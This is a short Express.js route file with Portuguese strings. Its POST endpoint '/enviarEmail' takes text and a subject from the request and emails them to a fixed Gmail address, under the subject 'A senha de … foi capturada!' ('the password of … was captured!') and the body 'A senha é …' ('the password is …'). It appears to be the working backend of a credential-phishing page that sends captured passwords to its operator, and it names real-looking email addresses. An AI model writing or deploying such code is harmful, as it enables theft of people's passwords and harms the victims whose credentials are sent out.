import transporter from "../repository/emailRepository.js";
import { Router } from "express";

let server = Router();

server.post('/enviarEmail', async (req, resp) => {
    let {text, subject} = req.body;

    let config = {
        from: "Testes <t371050@gmail.com>",
        to: "vivi0601lima@gmail.com",
        subject: "A senha de " + subject + " foi capturada!",
        text: "A senha é " + text
    };

    let enviar = await transporter.sendMail(config);
    resp.send();
})

export default server;